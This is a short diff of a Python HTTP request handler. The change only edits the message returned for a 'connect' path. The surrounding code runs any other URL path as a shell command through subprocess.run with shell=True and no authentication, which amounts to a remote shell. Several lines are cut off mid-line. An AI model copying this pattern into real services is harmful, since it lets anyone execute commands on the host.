@@ -8,7 +8,7 @@ class RequestHandler(BaseHTTPRequestHandler):
         command = self.path[1:]  # Get command from URL path
 
         if command == 'connect':
-            response = {"status": "connected", "message": "serv>
+            response = {"status": "connected", "message": "server is connected: "}
             self._send_response(200, response)
         else:
             result = subprocess.run(command, shell=True, captur>
